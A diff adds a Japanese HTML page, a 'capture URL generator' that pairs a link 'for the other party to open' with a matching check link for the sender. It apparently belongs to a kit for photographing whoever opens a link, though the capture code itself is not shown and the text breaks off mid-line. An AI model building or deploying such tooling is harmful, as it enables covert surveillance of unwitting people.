@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>撮影URL生成ツール</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #222;
+      color: white;
+      text-align: center;
+      padding: 50px;
+    }
+    input, button {
+      font-size: 1rem;
+      padding: 10px;
+      border-radius: 8px;
+      border: none;
+    }
+    button {
+      background: orange;
+      color: black;
+      cursor: pointer;
+    }
+    .url-box {
+      margin-top: 20px;
+      background: #333;
+      padding: 15px;
+      border-radius: 8px;
+      word-wrap: break-word;
+    }
+  </style>
+</head>
+<body>
+  <h1>撮影URL生成ツール</h1>
+  <button id="generateBtn">URLを生成する</button>
+
+  <div id="result" class="url-box"></div>
+
+  <script>
+    const generateBtn = document.getElementById("generateBtn");
+    const result = document.getElementById("result");
+
+    generateBtn.addEventListener("click", () => {
+      const randomId = Math.random().toString(36).substring(2, 8);
+      const base = "https://YOUR_GITHUB_USERNAME.github.io/YOUR_REPO_NAME";
+      const captureURL = `${base}/index.html?id=${randomId}`;
+      const checkURL = `${base}/check.html?id=${randomId}`;
+
+      result.innerHTML = `
+        ✅ <b>相手が開く用URL</b><br>
+        <a href="${captureURL}" target="_blank" style="color:
